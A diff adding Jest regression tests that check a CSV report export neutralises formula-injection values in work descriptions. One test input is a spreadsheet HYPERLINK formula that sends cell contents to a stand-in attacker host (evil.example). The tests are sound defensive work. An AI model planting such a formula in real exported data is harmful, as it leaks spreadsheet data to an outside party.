@@ -301,6 +301,58 @@ describe('Report Routes', () => {
     });
   });
 
+  describe('CSV Formula Injection', () => {
+    // Regression test: descriptions were previously written verbatim, so a stored value
+    // beginning with =, +, - or @ executed as a formula when opened in a spreadsheet.
+    const exportWithDescriptions = async (descriptions) => {
+      mockDb.get.mockImplementation((query, params, callback) => {
+        callback(null, { id: 1, name: 'Test Client' });
+      });
+      mockDb.all.mockImplementation((query, params, callback) => {
+        callback(null, descriptions.map((description, index) => ({
+          date: '2024-01-01',
+          hours: index + 1,
+          description,
+          created_at: '2024-01-01'
+        })));
+      });
+
+      const writeRecords = jest.fn().mockRejectedValue(new Error('stop after capture'));
+      require('csv-writer').createObjectCsvWriter.mockReturnValue({ writeRecords });
+
+      await request(app).get('/api/reports/export/csv/1');
+
+      return writeRecords.mock.calls[0][0];
+    };
+
+    test.each([
+      ['=HYPERLINK("http://evil.example/?"&A1,"click")'],
+      ['+1+1'],
+      ['-2+3'],
+      ['@SUM(A1:A9)'],
+      ['\tleading tab'],
+      ['\rleading carriage return']
+    ])('should neutralise a description starting with %j', async (description) => {
+      const records = await exportWithDescriptions([description]);
+
+      expect(records[0].description).toBe(`'${description}`);
+    });
+
+    test('should leave ordinary descriptions untouched', async () => {
+      const records = await exportWithDescriptions(['Normal work description', 'Fixed bug #42']);
+
+      expect(records[0].description).toBe('Normal work description');
+      expect(records[1].description).toBe('Fixed bug #42');
+    });
+
+    test('should not alter non-string fields', async () => {
+      const records = await exportWithDescriptions(['Normal work']);
+
+      expect(records[0].hours).toBe(1);
+      expect(records[0].date).toBe('2024-01-01');
+    });
+  });
+
   describe('CSV Export Success Path', () => {
     test('should handle CSV write error', async () => {
       const mockClient = { id: 1, name: 'Test Client' };
